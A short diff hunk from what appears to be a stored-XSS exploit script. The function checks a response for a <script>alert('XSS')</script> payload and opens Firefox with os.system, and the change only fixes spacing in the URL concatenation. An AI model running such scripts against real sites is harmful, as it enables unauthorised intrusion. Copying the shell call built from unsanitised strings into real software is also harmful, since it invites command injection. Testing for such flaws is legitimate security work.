@@ -52,7 +52,7 @@ def xss(url, command, csrf, path):
         if (b'<script>alert(\'XSS\')</script>' in r.content):
             print("(+) Stored XSS Successful!")
             # open firefox window to see the popup
-            os.system("firefox " + url +path)
+            os.system("firefox " + url + path)
         else:
             print("(-) Stored XSS Failed")
 
